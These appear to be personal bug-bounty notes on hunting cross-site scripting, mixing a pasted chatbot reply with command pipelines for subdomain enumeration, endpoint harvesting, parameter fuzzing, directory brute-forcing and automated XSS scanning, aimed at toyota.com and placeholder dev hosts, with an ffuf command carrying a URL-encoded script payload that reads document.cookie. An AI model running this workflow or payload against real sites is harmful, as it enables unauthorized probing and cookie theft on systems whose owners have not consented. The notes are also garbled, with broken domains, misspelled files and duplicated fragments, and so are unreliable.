Use    `Hookbin.com`   as if it is burp collaporator . 
```unknown
wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/XSS.txt,urlencode http://172.16.1.102/mutillidae/index.php?page=FUZZ
```


`Wafwoof  url `  to detect the   web application firewall  

[You are now signed out. | Socrata](https://opendata.test-socrata.com/signed_out?return_to=%2Fen%2Fadmin%2Fassets) 





Apologies for the oversight. Here's an updated list of commands incorporating the additional tools mentioned in the article:

1. **Subdomain Enumeration:**
    
    - Use tools like `sublist3r`, `subfinder`, `assetfinder`, and `amass` to gather subdomains.
    - Use `gau` and `katana` to fetch known URLs from the Wayback Machine.
    - Use `ffuf` for fuzzing subdomains.
    
    bash
    

- sublist3r -d toyota.com >> Subdomains.txt 
- Subfinder -d toyota. Com >> Subdomains. Txt
- Assetfinder --subs-only toyota. Com >> Subdomains. Txt 
- Amass enum -d toyota. Com >> Subdomains. Txt 
- echo "toyota. Com" | gau --threads 5 >> Endpoints. Txt cat httpx. Txt | katana -jc >> Endpoints. Txt cat Endpoints. Txt | uro >> Endpoints_F.txt  
- ffuf -u "https://FUZZ.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php?auth_status=%3CsCriPt%3Econfirm%28documen.cookie%29%3C%2FScRipt%3E" -w Subdomains.txt -c -v`
    
- **Parameter Fuzzing:**
    
    - Use Arjun or a browser extension like Param Miner for parameter fuzzing.
    
    bash
    
- `arjun -u https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php -m GET -w Parameters_Fuzz.txt`
    
- **Automated Scripting:**
    
    - Automate repetitive tasks with custom scripts tailored to specific needs.
    
    bash
    
- `# Custom scripts for automation`
    
- **XSS Automation Tools:**
    
    - Use Dalfox or other XSS automation tools for scanning.
    
    bash
    
- `dalfox file XSS_Ref.txt -o Vulnerable_XSS.txt`
    
- **Web Application Firewall (WAF):**
    
    - Implement and configure a WAF to filter out malicious requests.
    
    bash
    

1. `# Configuration of WAF`
    

These commands integrate the additional tools mentioned in the article along with the previously provided commands. Let me know if you need further assistance or clarification!





# Manual :
Sublist3r -d toyota. Com >> Subdomains. Txt 
Subfinder -d toyota. Com >> Subdomains. Txt
Assetfinder --subs-only toyota. Com >> Subdomains. Txt 
Amass enum -d toyota. Com >> Subdomains. Txt 
echo "toyota. Com" | gau --threads 5 >> Endpoints. Txt cat httpx. Txt | katana -jc >> Endpoints. Txt cat Endpoints. Txt | uro >> Endpoints_F.txt  
ffuf -u " https://FUZZ.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php?auth_status=%3CsCriPt%3Econfirm%28documen.cookie%29%3C%2FScRipt%3E" -w Subdomains. Txt -c -v `
httpx -l subdomains.txt -o httpx.txt
echo "toyota.com" | gau --threads 5 >> Enpoints.txt
cat httpx.txt | katana -jc >> Enpoints.txt
cat Enpoints.txt | uro >> Endpoints_F.txt
cat Endpoints_F.txt | gf xss >> XSS.txt  
`# For getting the endpoints that have parameters which may be vulnerable to XSS`
cat XSS.txt | Gxss -p khXSS -o XSS_Ref.txt
dalfox file XSS_Ref.txt -o Vulnerable_XSS.txt

arjun -u https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php -m GET -w Parameters_Fuzz.txt  
`# (-u) for our target && (-m GET) sending requests using the GET method  && (-w) for custom wordlist that`
dirsearch -u https://tst2.dev.targets.com/ -w wordlist.txt -e php,cgi,htm,html,shtm,shtml,js,txt --random-agent   
`# (-u) for the target && (-w) for custom wordlist that would be used with the tool && (-e) different extesions that would be used with the tool  &&  (--random-agent) to change the user agents for requests` 


ffuf -u " https://FUZZ.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php?auth_status=%3CsCriPt%3Econfirm%28documen.cookie%29%3C%2FScRipt%3E" -w subdomains.txt -c -v








# FINAL  LOOK :
```
# Subdomain Enumeration
sublist3r -d $target >> Subdomains.txt
subfinder -d $target >> Subdomains.txt
assetfinder --subs-only $target >> Subdomains.txt
amass enum -d $target >> Subdomains.txt
httpx -l Subdomains.txt -o httpx.txt

# Endpoint Discovery and Vulnerability Scanning
echo $target | gau --threads 5 >> Endpoints.txt     #i made it named gauy in my laptop what i really used is  gauy $target >> Endpoints.txt 
cat httpx.txt | katana -jc >> Endpoints.txt
cat Endpoints.txt | uro >> Endpoints_F.txt
ffuf -u "https://FUZZ.toyota.com/cgi-bin/fr.cfg/php/custom/id-pass.php?auth_status=%3CsCriPt%3Econfirm%28documen.cookie%29%3C%2FScRipt%3E" -w Subdomains.txt -c -v
httpx -l subdomains.txt -o httpx.txt

# XSS Vulnerability Detection
cat Endpoints_F.txt | gf xss >> XSS.txt
cat XSS.txt | gxss -p khXSS -o XSS_Ref.txt
dalfox file XSS_Ref.txt -o Vulnerable_XSS.txt

# Parameter Fuzzing
arjun -u https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php -m GET -w Parameters_Fuzz.txt

# Directory Enumeration
dirsearch -u https://tst2.dev.targets.com/ -w wordlist.txt -e php,cgi,htm,html,shtm,shtml,js,txt --random-agent

```
We need  those lists  in the cd ..    ( directories list), ( paramters list)